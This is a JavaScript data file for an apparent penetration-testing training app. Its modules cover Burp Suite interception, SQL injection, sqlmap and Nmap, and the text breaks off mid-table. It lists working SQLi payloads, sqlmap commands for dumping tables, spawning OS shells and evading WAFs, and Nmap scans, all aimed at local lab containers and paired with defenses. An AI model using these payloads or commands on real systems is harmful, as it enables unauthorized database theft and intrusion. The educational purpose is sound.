/* ── Splash Screen Controller — runs before any other init ───────────────────
   Shows on cold launch only (sessionStorage flag).
   Total sequence: logo in (0.6s) → text in (0.5s) → bar fill (0.9s) → exit (0.5s)
   ─────────────────────────────────────────────────────────────────────────── */
(function initSplash() {
  const splash = document.getElementById('splash');
  if (!splash) return;

  // Skip on hot reloads / re-navigations within the same session
  if (sessionStorage.getItem('cc_launched')) {
    splash.remove();
    return;
  }
  sessionStorage.setItem('cc_launched', '1');
  window.CCMotion && CCMotion.boot(splash, ['> init lab modules', '> load tutorials', '> ready']);

  // Bar fill animation ends at ~1.4s, we exit at 1.45s and remove at 1.95s
  setTimeout(() => {
    splash.classList.add('splash-exit');
    setTimeout(() => splash.remove(), 520);
  }, 1450);
})();

/* ═══════════════════════════════════════════════════════════════════════════════
   CyberCompanion — Renderer v1.1
   5 Modules · Docker Wizard · Defense Sections · Copy Buttons
   ═══════════════════════════════════════════════════════════════════════════════ */

// ─── SVG Icons ──────────────────────────────────────────────────────────────────
const ICONS = {
  copy:     `<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="9" y="9" width="13" height="13" rx="2"/><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/></svg>`,
  check:    `<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><polyline points="20 6 9 17 4 12"/></svg>`,
  concept:  `<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="10"/><line x1="12" y1="16" x2="12" y2="12"/><line x1="12" y1="8" x2="12.01" y2="8"/></svg>`,
  analogy:  `<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M9.09 9a3 3 0 0 1 5.83 1c0 2-3 3-3 3"/><circle cx="12" cy="12" r="10"/><line x1="12" y1="17" x2="12.01" y2="17"/></svg>`,
  exercise: `<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><polyline points="4 17 10 11 4 5"/><line x1="12" y1="19" x2="20" y2="19"/></svg>`,
  reference:`<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"/><polyline points="14 2 14 8 20 8"/><line x1="16" y1="13" x2="8" y2="13"/><line x1="16" y1="17" x2="8" y2="17"/></svg>`,
  defense:  `<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></svg>`,
  error:    `<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="10"/><line x1="15" y1="9" x2="9" y2="15"/><line x1="9" y1="9" x2="15" y2="15"/></svg>`,
  docker:   `<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="2" y="3" width="20" height="14" rx="2"/><line x1="8" y1="21" x2="16" y2="21"/><line x1="12" y1="17" x2="12" y2="21"/></svg>`,
  shield:   `<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></svg>`
};

/* ─── Line icons (stroke, inherit currentColor) — replace emoji ───────────── */
const LI = {
  target:   `<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="9"/><circle cx="12" cy="12" r="4"/><line x1="12" y1="1" x2="12" y2="5"/><line x1="12" y1="19" x2="12" y2="23"/><line x1="1" y1="12" x2="5" y2="12"/><line x1="19" y1="12" x2="23" y2="12"/></svg>`,
  terminal: `<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><polyline points="4 17 10 11 4 5"/><line x1="12" y1="19" x2="20" y2="19"/></svg>`,
  flask:    `<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M9 3h6"/><path d="M10 3v6l-5 9a2 2 0 0 0 1.8 3h10.4a2 2 0 0 0 1.8-3l-5-9V3"/><line x1="7.5" y1="15" x2="16.5" y2="15"/></svg>`,
  shield:   `<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></svg>`,
  signal:   `<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M5 12.5a9 9 0 0 1 14 0"/><path d="M8.5 15.5a4.5 4.5 0 0 1 7 0"/><circle cx="12" cy="18.5" r="1"/></svg>`,
  trophy:   `<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M8 21h8M12 17v4M7 4h10v5a5 5 0 0 1-10 0z"/><path d="M7 5H4v2a3 3 0 0 0 3 3M17 5h3v2a3 3 0 0 1-3 3"/></svg>`,
  bolt:     `<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><polygon points="13 2 3 14 11 14 11 22 21 10 13 10 13 2"/></svg>`,
  activity: `<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><polyline points="22 12 18 12 15 21 9 3 6 12 2 12"/></svg>`,
  lock:     `<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="3" y="11" width="18" height="11" rx="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/></svg>`,
  globe:    `<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="9"/><line x1="3" y1="12" x2="21" y2="12"/><path d="M12 3a15 15 0 0 1 0 18 15 15 0 0 1 0-18z"/></svg>`,
  gear:     `<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="3"/><path d="M19.4 15a1.65 1.65 0 0 0 .33 1.82l.06.06a2 2 0 1 1-2.83 2.83l-.06-.06a1.65 1.65 0 0 0-1.82-.33 1.65 1.65 0 0 0-1 1.51V21a2 2 0 0 1-4 0v-.09A1.65 1.65 0 0 0 9 19.4a1.65 1.65 0 0 0-1.82.33l-.06.06a2 2 0 1 1-2.83-2.83l.06-.06a1.65 1.65 0 0 0 .33-1.82 1.65 1.65 0 0 0-1.51-1H3a2 2 0 0 1 0-4h.09A1.65 1.65 0 0 0 4.6 9a1.65 1.65 0 0 0-.33-1.82l-.06-.06a2 2 0 1 1 2.83-2.83l.06.06a1.65 1.65 0 0 0 1.82.33H9a1.65 1.65 0 0 0 1-1.51V3a2 2 0 0 1 4 0v.09a1.65 1.65 0 0 0 1 1.51 1.65 1.65 0 0 0 1.82-.33l.06-.06a2 2 0 1 1 2.83 2.83l-.06.06a1.65 1.65 0 0 0-.33 1.82V9a1.65 1.65 0 0 0 1.51 1H21a2 2 0 0 1 0 4h-.09a1.65 1.65 0 0 0-1.51 1z"/></svg>`
};


/* ═══════════════════════════════════════════════════════════════════════════════
   MODULE DATA
   ═══════════════════════════════════════════════════════════════════════════════ */

const MODULES = [

// ─────────────────────────────────────────────────────────────────────────────
// MODULE 1: Burp Suite Proxy Interception
// ─────────────────────────────────────────────────────────────────────────────
{
  id: 'burp-proxy', num: '01',
  title: 'Burp Suite Proxy Interception',
  subtitle: 'Learn how web proxies capture, inspect, and modify HTTP traffic between your browser and a target application.',
  tag: 'Module 1 — Proxy Fundamentals',

  concept: [
    `Every time you visit a website, your browser sends an <strong>HTTP request</strong> to a server, which replies with an <strong>HTTP response</strong>. Normally this exchange is invisible — it happens in milliseconds behind the scenes.`,
    `A <strong>web proxy</strong> is software that sits <em>between</em> your browser and the server. It intercepts every request and response, letting you read, modify, or replay them before they reach their destination.`,
    `<strong>Burp Suite</strong> is the industry-standard web proxy for penetration testers. When you enable its <strong>Intercept</strong> feature, every outbound request from Burp's built-in Chromium browser is paused and displayed in a raw text editor. You can change parameters, headers, or the body — then forward the modified request to the server.`,
    `This gives you complete control over the conversation between client and server, which is the foundation of almost every web application attack.`
  ],

  analogy: { emoji: '📬', text: `Imagine a postal inspector stationed at a sorting facility. Every letter (HTTP request) leaving your house passes through the inspector's desk. They can open the envelope, read the contents, change the delivery address, swap the letter inside, or simply let it pass through. The recipient (server) has no idea the letter was ever touched. That inspector is your Burp Suite proxy.` },

  steps: [
    { title: 'Start Burp Suite and Open the Built-in Browser', desc: 'Launch Burp Suite Community Edition. Navigate to the <strong>Proxy</strong> tab and click <strong>"Open browser"</strong>. This opens a Chromium instance pre-configured to route all traffic through Burp — no manual proxy settings needed.', code: null },
    { title: 'Enable Intercept Mode', desc: 'In the <strong>Proxy → Intercept</strong> sub-tab, click the toggle so it reads <strong>"Intercept is on"</strong>. From this moment, every HTTP request from the built-in browser will be paused and shown to you.', code: null },
    { title: 'Browse to the Juice Shop Target', desc: 'In Burp\'s built-in browser, navigate to the local Juice Shop instance. The page will appear to hang because Burp is holding the request.', code: { lang: 'url', text: 'http://localhost:3000' } },
    { title: 'Inspect the Intercepted Request', desc: 'Switch back to the Burp window. You\'ll see the raw GET request in the Intercept panel. Study the structure — the request line, Host header, User-Agent, cookies, and any query parameters.', code: { lang: 'http', text: 'GET / HTTP/1.1\nHost: localhost:3000\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)\nAccept: text/html,application/xhtml+xml\nAccept-Language: en-US,en;q=0.9\nConnection: keep-alive' } },
    { title: 'Forward and Observe the Response', desc: 'Click <strong>"Forward"</strong> in Burp to send the request to the server. The Juice Shop homepage will now load. Check the <strong>HTTP history</strong> sub-tab to see both the request and the server\'s response, including status code, headers, and body.', code: null },
    { title: 'Modify a Request In-Flight', desc: 'Navigate to the Juice Shop login page. When Burp intercepts the POST request, change a parameter value directly in the raw editor before forwarding it. This is the core skill you\'ll use in every subsequent module.', code: { lang: 'http', text: 'POST /rest/user/login HTTP/1.1\nHost: localhost:3000\nContent-Type: application/json\n\n{"email":"test@test.com","password":"modified_value"}' } },
    { title: 'Abusing Client-Side Validation', desc: 'A common vulnerability is relying solely on the browser (client) for security checks. In Juice Shop, try giving a product a negative quantity or an unrealistic price. The browser UI might prevent you from typing "-1", but you can intercept the API request in Burp and change the quantity to a negative number before it hits the server.', code: { lang: 'json', text: '{"ProductId": 1, "quantity": -10}' } },
    { title: 'Discover the Hidden Score Board', desc: 'Juice Shop has a hidden "Score Board" tracking your hacking progress. The link is hidden in the UI, but by intercepting the main JavaScript bundle request and looking at the response (or using Repeater), you can find the path. Then simply browse to it.', code: { lang: 'url', text: 'http://localhost:3000/#/score-board' } },
    { title: 'Using Burp Repeater', desc: 'Find any request in your <strong>HTTP history</strong>, right-click, and select <strong>Send to Repeater</strong>. Repeater allows you to replay the exact same request hundreds of times, tweaking one parameter at a time and instantly seeing the response without clicking through the UI again.', code: null }
  ],

  defense: [
    { title: 'HTTPS / TLS Encryption', desc: 'Encrypt all traffic with TLS certificates. Even if intercepted on the network, the data is unreadable without the private key. Always redirect HTTP to HTTPS.' },
    { title: 'HTTP Strict Transport Security (HSTS)', desc: 'Set the <code>Strict-Transport-Security</code> header so browsers refuse to connect over plain HTTP after the first visit.' },
    { title: 'Certificate Pinning', desc: 'Mobile apps can pin the server\'s exact certificate, rejecting proxy certificates like Burp\'s. This prevents MITM on production mobile traffic.' },
    { title: 'Input Validation on the Server', desc: 'Never trust client-side data. Validate and sanitize every parameter on the server — a proxy can bypass any client-side checks (like min/max length, regex, or dropdown restrictions).' }
  ],

  payloads: { headers: ['Item', 'Description', 'Example'], rows: [
    ['GET',           'Retrieves a resource from the server',                      'GET /api/users HTTP/1.1'],
    ['POST',          'Sends data to the server (login forms, file uploads)',       'POST /rest/user/login HTTP/1.1'],
    ['PUT',           'Replaces an entire resource on the server',                 'PUT /api/users/1 HTTP/1.1'],
    ['DELETE',        'Removes a resource from the server',                        'DELETE /api/users/1 HTTP/1.1'],
    ['Host',          'Header specifying the target domain',                       'Host: localhost:3000'],
    ['Cookie',        'Header carrying session tokens',                            'Cookie: token=abc123'],
    ['Content-Type',  'Header declaring the format of the request body',           'Content-Type: application/json'],
    ['Authorization', 'Header carrying credentials (Basic, Bearer, etc.)',         'Authorization: Bearer eyJhb...'],
    ['200 OK',        'Server processed the request successfully',                 'HTTP/1.1 200 OK'],
    ['301 Redirect',  'Resource moved permanently to another URL',                 'HTTP/1.1 301 Moved Permanently'],
    ['403 Forbidden', 'Server refuses to authorize the request',                   'HTTP/1.1 403 Forbidden'],
    ['500 Server Error','Unexpected error on the server side',                     'HTTP/1.1 500 Internal Server Error']
  ]}
},

// ─────────────────────────────────────────────────────────────────────────────
// MODULE 2: SQL Injection (SQLi)
// ─────────────────────────────────────────────────────────────────────────────
{
  id: 'sqli', num: '02',
  title: 'SQL Injection (SQLi)',
  subtitle: 'Understand how unsanitized user input can manipulate backend database queries to leak data or bypass authentication.',
  tag: 'Module 2 — Database Exploitation',

  concept: [
    `Most web applications store data in a <strong>relational database</strong> (MySQL, PostgreSQL, SQLite). When you submit a form — like a login or search box — the application builds an <strong>SQL query</strong> using your input.`,
    `For example, a login form might produce: <code>SELECT * FROM users WHERE username = 'your_input' AND password = 'your_password'</code>. If the developer concatenates your input directly into the query without sanitizing it, you can inject your own SQL syntax.`,
    `By inserting a carefully crafted string like <code>' OR '1'='1</code>, you change the query's logic so it always returns true — effectively bypassing the password check and returning all rows.`,
    `SQL Injection can lead to <strong>complete database compromise</strong>: reading all user records, extracting password hashes, modifying data, or even executing OS commands through database functions like <code>xp_cmdshell</code>.`
  ],

  analogy: { emoji: '🏦', text: `Imagine walking into a bank and handing the teller a withdrawal slip. Normally you write your account number and amount. But what if the teller blindly reads whatever you write? You could write: "Withdraw $100 from account #1234 OR just give me everything from every account." Because the teller doesn't validate the slip, they hand over the entire vault. That's SQL Injection.` },

  steps: [
    { title: 'Open DVWA and Set Security Level', desc: 'Navigate to the local DVWA instance in Burp\'s built-in browser. Log in with the default credentials. Then go to <strong>DVWA Security</strong> and set the level to <strong>Low</strong>.', code: { lang: 'text', text: 'URL:      http://localhost:8080\nUsername: admin\nPassword: password' } },
    { title: 'Test Normal Input in DVWA', desc: 'Go to "SQL Injection". Enter <code>1</code> in the User ID field and click Submit. The application returns user information for ID 1, confirming the form is connected to a live database.', code: { lang: 'sql', text: "-- What the server executes internally:\nSELECT first_name, last_name FROM users WHERE user_id = '1';" } },
    { title: 'Inject a Tautology Payload (DVWA)', desc: 'Now enter the classic SQLi tautology payload. This modifies the WHERE clause so it always evaluates to TRUE, causing the database to dump all records.', code: { lang: 'text', text: "1' OR '1'='1" } },
    { title: 'Juice Shop Admin Bypass', desc: 'Now let\'s try a modern app. Open Juice Shop (http://localhost:3000) and go to the login page. In the email field, input the administrator email followed by a SQL comment. Put anything in the password field.', code: { lang: 'text', text: "Email: admin@juice-sh.op' --\nPassword: a" } },
    { title: 'Understand the Juice Shop Bypass', desc: 'By adding the comment characters (`--`), you tell the SQLite database engine to ignore the rest of the query. The password check is never executed!', code: { lang: 'sql', text: "-- Internal Query becomes:\nSELECT * FROM Users WHERE email = 'admin@juice-sh.op' --' AND password = 'a';" } },
    { title: 'Error-Based SQLi', desc: 'Sometimes you don\'t get a clean dump, but the server spits out database errors. Try placing a single quote (`\'`) into the Juice Shop search bar or a product review. If the page returns a stack trace mentioning "SQLITE_ERROR", you have confirmed it is vulnerable.', code: { lang: 'text', text: "Search: apple'" } },
    { title: 'Extract Database Version with UNION SELECT', desc: 'Back in DVWA, use a UNION-based injection to extract the database version. First determine the column count (DVWA uses 2 columns), then inject:', code: { lang: 'text', text: "1' UNION SELECT user(), version()-- -" } },
    { title: 'Enumerate All Tables', desc: 'Once you know the column count, you can enumerate every table in the database by querying <code>information_schema</code>:', code: { lang: 'text', text: "1' UNION SELECT table_name, table_schema FROM information_schema.tables-- -" } },
    { title: 'Extract Passwords', desc: 'Now target the users table to extract password hashes. These can later be cracked offline with tools like John the Ripper or hashcat:', code: { lang: 'text', text: "1' UNION SELECT user, password FROM users-- -" } }
  ],

  defense: [
    { title: 'Parameterized Queries / Prepared Statements', desc: 'The #1 defense. Use placeholders (<code>?</code> or <code>:name</code>) instead of string concatenation. The database driver treats user input as data, never as SQL syntax. Example in PHP: <code>$stmt = $pdo->prepare("SELECT * FROM users WHERE id = ?"); $stmt->execute([$id]);</code>' },
    { title: 'Input Validation & Whitelisting', desc: 'If a field should be a number, cast it to an integer. If it\'s a name, allow only alphanumeric characters. Reject anything that doesn\'t match the expected pattern.' },
    { title: 'Least-Privilege Database Accounts', desc: 'The web application\'s database user should have only SELECT/INSERT/UPDATE on the tables it needs — never DBA or root privileges. This limits the damage even if SQLi succeeds.' },
    { title: 'Web Application Firewall (WAF)', desc: 'Deploy a WAF (e.g., ModSecurity) to detect and block common SQLi patterns in real time. Not a replacement for secure code, but a valuable layer of defense.' },
    { title: 'Generic Error Handling', desc: 'Never expose raw database errors to the user. Use generic error pages. Detailed SQL error messages reveal table names, column types, and query structure to attackers.' }
  ],

  payloads: { headers: ['Payload', 'Purpose', 'Risk'], rows: [
    ["' OR '1'='1",                          'Tautology — bypasses WHERE clause, returns all rows',       'High'],
    ["' OR '1'='1'-- -",                     'Tautology with comment — ignores remaining SQL',            'High'],
    ["' UNION SELECT null,null-- -",         'Column count detection for UNION-based injection',           'Medium'],
    ["' UNION SELECT user(),version()-- -",  'Extracts current DB user and version string',               'High'],
    ["' UNION SELECT table_name,null FROM information_schema.tables-- -", 'Enumerates all table names',   'High'],
    ["' UNION SELECT column_name,null FROM information_schema.columns WHERE table_name='users'-- -", 'Extracts column names from target table', 'High'],
    ["' AND 1=1-- -",                        'Boolean-based blind test — page normal if true',             'Medium'],
    ["' AND 1=2-- -",                        'Boolean-based blind test — page changes if false',           'Medium'],
    ["' AND SLEEP(5)-- -",                   'Time-based blind test — delays response by 5 seconds',       'Medium'],
    ["admin@juice-sh.op'--",                 'Juice Shop Auth bypass — SQLite comment syntax',             'High'],
    ["id=1'+OR+'1'='1&Submit=Submit",        'URL-encoded tautology for Burp Repeater (DVWA)',             'High']
  ]}
},

// ─────────────────────────────────────────────────────────────────────────────
// MODULE 3: SQLmap — Automated SQL Injection
// ─────────────────────────────────────────────────────────────────────────────
{
  id: 'sqlmap', num: '03',
  title: 'SQLmap — Automated SQL Injection',
  subtitle: 'After understanding manual SQLi, learn how SQLmap automates detection, exploitation, and full database extraction.',
  tag: 'Module 3 — Automation & Tooling',

  concept: [
    `<strong>SQLmap</strong> is an open-source penetration testing tool that automates the entire SQL Injection lifecycle — detection, exploitation, and data extraction. It is pre-installed on Kali Linux.`,
    `It supports all major injection techniques: <strong>boolean-based blind</strong>, <strong>time-based blind</strong>, <strong>error-based</strong>, <strong>UNION-based</strong>, and <strong>stacked queries</strong>. SQLmap automatically fingerprints the database engine (MySQL, PostgreSQL, MSSQL, Oracle, SQLite) and adjusts its payloads accordingly.`,
    `<strong>Why use it after learning manual SQLi?</strong> Manual injection teaches you the underlying mechanics — you understand <em>why</em> things work. SQLmap then lets you scale that knowledge efficiently: it tests hundreds of payloads in seconds, handles encoding/escaping edge cases, and can dump entire databases automatically.`,
    `SQLmap can also read/write files on the server filesystem, execute OS commands (if the DB user has sufficient privileges), and even spawn an interactive shell — making it one of the most powerful tools in a pentester's toolkit.`
  ],

  analogy: { emoji: '🤖', text: `You've just learned to pick a single lock by hand — you understand how the pins work, how tension wrenches apply pressure, and how to feel for the click. SQLmap is like a robotic lockpicking machine that can test every pin combination across every lock in the building in minutes. It uses the same techniques you learned by hand, but at machine speed. You still need to understand the fundamentals to interpret results and troubleshoot failures.` },

  steps: [
    { title: 'Identify the Target URL', desc: 'First, use Burp Suite (Module 1) to identify a URL with a parameter you suspect is vulnerable. For DVWA\'s SQLi page, the URL looks like this:', code: { lang: 'text', text: 'http://localhost:8080/vulnerabilities/sqli/?id=1&Submit=Submit' } },
    { title: 'Run a Basic SQLmap Scan (DVWA)', desc: 'Open a terminal in Kali Linux. Pass the target URL to SQLmap with the <code>-u</code> flag. Include the session cookie so SQLmap is authenticated. SQLmap will test the <code>id</code> parameter for injection vulnerabilities.', code: { lang: 'bash', text: 'sqlmap -u "http://localhost:8080/vulnerabilities/sqli/?id=1&Submit=Submit" \\\n  --cookie="PHPSESSID=your_session_id; security=low"' } },
    { title: 'Automating JSON APIs (Juice Shop)', desc: 'Juice Shop uses JSON payloads, not standard form fields. Using `-u` is tedious for JSON. Instead, intercept the login request in Burp Suite, right-click, and select "Save item" as `request.txt`.', code: { lang: 'http', text: 'POST /rest/user/login HTTP/1.1\nHost: localhost:3000\nContent-Type: application/json\n\n{"email":"test@test.com","password":"test"}' } },
    { title: 'Run SQLmap with a Burp Request', desc: 'Use the `-r` flag to point SQLmap to the saved file. SQLmap will automatically parse the headers, URL, and the JSON body, and start testing every JSON value.', code: { lang: 'bash', text: 'sqlmap -r request.txt --batch' } },
    { title: 'Enumerate All Databases', desc: 'Once SQLmap confirms the injection point, use <code>--dbs</code> to list every database on the server:', code: { lang: 'bash', text: 'sqlmap -r request.txt --dbs' } },
    { title: 'Enumerate Tables in a Database', desc: 'Pick a database from the results (e.g., <code>dvwa</code> or SQLite for Juice Shop) and list all its tables with <code>-D</code> and <code>--tables</code>:', code: { lang: 'bash', text: 'sqlmap -r request.txt -D dvwa --tables' } },
    { title: 'Dump the Data', desc: 'Extract the actual data from the columns you care about. SQLmap will even attempt to crack password hashes automatically using a dictionary attack:', code: { lang: 'bash', text: 'sqlmap -r request.txt -D dvwa -T users -C user,password --dump' } },
    { title: 'Using Tamper Scripts', desc: 'Web Application Firewalls (WAFs) often block basic SQLi syntax (like blocking spaces). SQLmap has "tamper scripts" to obfuscate payloads. Use `--tamper=space2comment` to replace spaces with `/**/` comments to bypass basic WAFs.', code: { lang: 'bash', text: 'sqlmap -r request.txt --tamper=space2comment --level=3 --risk=2' } }
  ],

  defense: [
    { title: 'Same Defenses as Manual SQLi', desc: 'All defenses from Module 2 apply — parameterized queries, input validation, least-privilege DB accounts, and WAFs are your primary protections.' },
    { title: 'Rate Limiting', desc: 'SQLmap sends many rapid requests. Rate limiting and anomaly detection can flag or block automated scanning patterns.' },
    { title: 'Intrusion Detection Systems (IDS)', desc: 'Tools like Snort or Suricata can detect SQLmap\'s signature patterns (user-agent strings, payload patterns) and alert security teams.' },
    { title: 'Disable Detailed Error Messages', desc: 'Error-based SQLi relies on the server exposing database errors. Configure the application to show generic error pages in production.' }
  ],

  payloads: { headers: ['Flag', 'Purpose', 'Example'], rows: [
    ['-u URL',         'Target URL with injectable parameter',              'sqlmap -u "http://target/page?id=1"'],
    ['-r FILE',        'Use a saved HTTP request file from Burp Suite',     'sqlmap -r request.txt'],
    ['--dbs',          'Enumerate all databases on the server',             'sqlmap -u URL --dbs'],
    ['-D DB --tables', 'List all tables in a specific database',            'sqlmap -u URL -D dvwa --tables'],
    ['-T TBL --columns','List columns in a specific table',                 'sqlmap -u URL -D dvwa -T users --columns'],
    ['--dump',         'Extract (dump) data from specified table/columns',  'sqlmap -u URL -D dvwa -T users --dump'],
    ['--batch',        'Non-interactive mode (auto-answers all prompts)',   'sqlmap -r req.txt --batch'],
    ['--level=N',      'Test thoroughness (1-5). Higher = more params',    'sqlmap -u URL --level=5'],
    ['--risk=N',       'Payload aggressiveness (1-3). Higher = riskier',   'sqlmap -u URL --risk=3'],
    ['--forms',        'Auto-detect and test HTML forms on a page',        'sqlmap -u "http://target/login" --forms'],
    ['--os-shell',     'Attempt to spawn an interactive OS shell',          'sqlmap -u URL --os-shell'],
    ['--cookie=C',     'Set HTTP Cookie header for authentication',         'sqlmap -u URL --cookie="PHPSESSID=abc"'],
    ['--threads=N',    'Parallelise requests (default 1, max 10)',         'sqlmap -u URL --threads=10'],
    ['--tamper=SCRIPT','Apply payload tampering scripts to bypass WAFs',    'sqlmap -u URL --tamper=space2comment']
  ]}
},

// ─────────────────────────────────────────────────────────────────────────────
// MODULE 4: Nmap — Network Scanning & Enumeration
// ─────────────────────────────────────────────────────────────────────────────
{
  id: 'nmap', num: '04',
  title: 'Nmap — Network Scanning & Enumeration',
  subtitle: 'Master the most widely-used network scanner. Learn every major flag and scan technique for discovering hosts, open ports, and running services.',
  tag: 'Module 4 — Reconnaissance',

  concept: [
    `<strong>Nmap (Network Mapper)</strong> is the de facto standard tool for network discovery and security auditing. It is pre-installed on Kali Linux and available for all major operating systems.`,
    `At its core, Nmap sends specially crafted packets to target hosts and analyses the responses to determine: which <strong>hosts are alive</strong> on a network, which <strong>ports are open</strong>, what <strong>services and versions</strong> are running on those ports, and what <strong>operating system</strong> the target is using.`,
    `Nmap supports dozens of scan types, from stealthy SYN scans that never complete a TCP handshake, to aggressive scans that fingerprint every service and run vulnerability detection scripts. The <strong>Nmap Scripting Engine (NSE)</strong> extends Nmap with hundreds of scripts for tasks like brute-forcing, vulnerability scanning, and even exploitation.`,
    `Understanding Nmap's flags is critical — each flag changes the scan behavior significantly. This module walks through every major flag group with practical examples.`
  ],

  analogy: { emoji: '🔦', text: `Imagine you're a security guard who just started a night shift at a massive office building. You need to check every floor and every door. A basic walk-through (ping scan) tells you which floors have lights on — i.e., which hosts are alive. Trying each door handle (port scan) tells you which rooms are unlocked. Peeking inside open rooms (version detection) tells you what equipment is inside. Reading the nameplates (OS detection) tells you who occupies each floor. Nmap is your all-in-one flashlight, master key, and notebook.` },

  steps: [
    { title: 'Scan your Docker Containers', desc: 'First, find out what ports are open on localhost. Nmap can scan your own machine to find the lab containers (Juice Shop on 3000, DVWA on 8080). Use `-p-` to scan all 65,535 ports.', code: { lang: 'bash', text: 'nmap -p- 127.0.0.1' } },
    { title: 'Service Version Detection', desc: 'The <code>-sV</code> flag probes open ports to determine the exact service name and version. Let\'s see what\'s running on ports 3000 and 8080.', code: { lang: 'bash', text: 'nmap -sV -p 3000,8080 127.0.0.1' } },
    { title: 'SYN Scan (Stealth Scan)', desc: 'The <code>-sS</code> flag performs a SYN scan — Nmap sends a SYN packet and waits for a SYN/ACK (open) or RST (closed) without completing the handshake. This is faster and stealthier than a full connect scan. Requires root/sudo privileges:', code: { lang: 'bash', text: 'sudo nmap -sS 192.168.1.1' } },
    { title: 'Aggressive Scan', desc: 'The <code>-A</code> flag combines OS detection, version detection, script scanning, and traceroute in a single command. This is the most information-rich scan but also the most detectable.', code: { lang: 'bash', text: 'sudo nmap -A 127.0.0.1' } },
    { title: 'NSE Script Scanning: HTTP Enum', desc: 'The Nmap Scripting Engine (NSE) runs Lua scripts. Use the `http-enum` script to automatically search the target web server for common directories, hidden admin panels, and known vulnerabilities.', code: { lang: 'bash', text: 'nmap -p 8080 --script http-enum 127.0.0.1' } },
    { title: 'NSE Script Scanning: HTTP Title', desc: 'Use the `http-title` script to quickly extract the `&lt;title&gt;` tag of the website on port 3000 without opening a browser. It will reveal "OWASP Juice Shop".', code: { lang: 'bash', text: 'nmap -p 3000 --script http-title 127.0.0.1' } },
    { title: 'Timing Templates', desc: 'Control scan speed with <code>-T</code> (0–5). Lower values are slower but stealthier. Higher values are faster but noisier. <code>-T4</code> is recommended for fast local scanning.', code: { lang: 'bash', text: 'nmap -T4 -p- 127.0.0.1' } },
    { title: 'Save Output to Files', desc: 'Always save scan results. Nmap supports multiple output formats. Using `-oA` saves it in normal, XML, and grepable formats simultaneously.', code: { lang: 'bash', text: 'nmap -sV -p 3000,8080 -oA lab_scan 127.0.0.1' } },
    { title: 'Scan an Entire Subnet', desc: 'In a real pentest, you scan whole networks. Use CIDR notation (e.g. `/24`) combined with <code>-sn</code> for a fast ping sweep to find live hosts before running port scans:', code: { lang: 'bash', text: 'nmap -sn 192.168.1.0/24' } }
  ],

  defense: [
    { title: 'Firewall Rules (iptables / Windows Firewall)', desc: 'Block or rate-limit incoming probe packets. Only expose ports that must be publicly accessible. Drop packets to unused ports silently (don\'t reject — rejecting confirms the host is alive).' },
    { title: 'Close Unnecessary Ports', desc: 'Every open port is a potential attack surface. Disable services you don\'t need. Run <code>ss -tlnp</code> or <code>netstat -tlnp</code> regularly to audit listening services.' },
    { title: 'Intrusion Detection / Prevention Systems', desc: 'Deploy IDS/IPS (Snort, Suricata) to detect Nmap scan patterns. Many can distinguish between SYN scans, OS fingerprinting, and NSE script traffic.' },
    { title: 'Banner Obfuscation', desc: 'Modify service banners to hide version information. For example, configure Apache to show "Server: " with no version string. This doesn\'t fix vulnerabilities but slows down attackers.' }
  ],

  payloads: { headers: ['Flag', 'Purpose', 'Example'], rows: [
    ['-sS',          'TCP SYN scan (stealth, default with root)',       'sudo nmap -sS target'],
    ['-sT',          'TCP Connect scan (no root needed)',               'nmap -sT target'],
    ['-sU',          'UDP port scan',                                    'sudo nmap -sU target'],
    ['-sV',          'Service/version detection on open ports',          'nmap -sV target'],
    ['-O',           'OS fingerprinting / detection',                    'sudo nmap -O target'],
